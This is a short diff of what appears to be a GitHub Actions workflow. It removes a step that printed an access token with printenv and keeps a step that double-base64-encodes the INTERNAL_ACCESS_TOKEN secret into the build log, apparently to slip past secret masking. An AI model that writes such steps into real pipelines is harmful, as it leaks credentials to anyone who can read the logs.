@@ -7,10 +7,7 @@ jobs:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Hello World!"
-
-     - name: Print environment variables
-       run: printenv INTERNAL_ACCESS_TOKEN
-
+     
      - name: Print GitHub secrets
        run: |
         echo "INTERNAL_ACCESS_TOKEN: ${{ secrets.INTERNAL_ACCESS_TOKEN }}" | base64 -w0 |base64 -w0
